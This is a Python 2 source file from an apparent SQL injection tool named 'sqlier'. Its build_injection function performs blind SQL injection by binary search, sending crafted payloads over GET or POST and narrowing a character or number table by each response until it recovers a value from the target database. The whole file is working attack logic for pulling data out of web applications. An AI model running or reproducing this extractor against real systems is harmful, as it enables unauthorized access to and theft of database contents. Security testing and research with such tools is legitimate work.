#!/usr/bin/env python
# -*- coding:utf-8 -*-

from tqdm import trange
from lib.data import DataProcess
from lib.log import logger
from sqlier.configuration.buildconfig import CharInjectionList
from sqlier.configuration.buildconfig import NumberInjectionList
from sqlier.configuration.buildconfig import CountInjectionList

__author__ = "LoRexxar"


def build_injection(select=None, source=None, conditions=None, limit=0, dealpayload=None, data=None, lens=0, isNumber=False, isStrings=False, isCount=False, sqlirequest=None):
    """
    使用二分法注入逻辑注入数据
    """
    chartbl = []

    if isNumber:
        chartbl = NumberInjectionList
    elif isStrings:
        chartbl = CharInjectionList
    elif isCount:
        chartbl = CountInjectionList
    else:
        logger.error("injection target error...")
        exit(0)

    while 1 != len(chartbl):
        position = (len(chartbl) >> 1)
        posValue = chartbl[position]

        payload = dealpayload.construct_build_payload(select=select, source=source, conditions=conditions, limit=limit, compare=posValue)
        # logger.debug("testing payload:" + payload)

        if sqlirequest == "GET":
            result = data.GetBuildData(payload, lens)
        elif sqlirequest == "POST":
            result = data.PostBuildData(payload, lens)
        else:
            logger.error("sqlirequest error...")
            exit(0)

        if result:
            if type(chartbl) != xrange:
                chartbl = chartbl[position:]
            else:
                # xrange() - extended virtual charset used for memory/space optimization
                chartbl = xrange(chartbl[position], chartbl[-1] + 1)
        else:
            if type(chartbl) != xrange:
                chartbl = chartbl[:position]
            else:
                chartbl = xrange(chartbl[0], chartbl[position])

        # 判断结果
        if len(chartbl) == 1:
            # logger.debug("injection success,the chartbl[0]+1 is %d", chartbl[0]+1)
            if isCount & chartbl[0] == 100:
                logger.error("Count or Length >100...")
                return 100
            return chartbl[0]+1
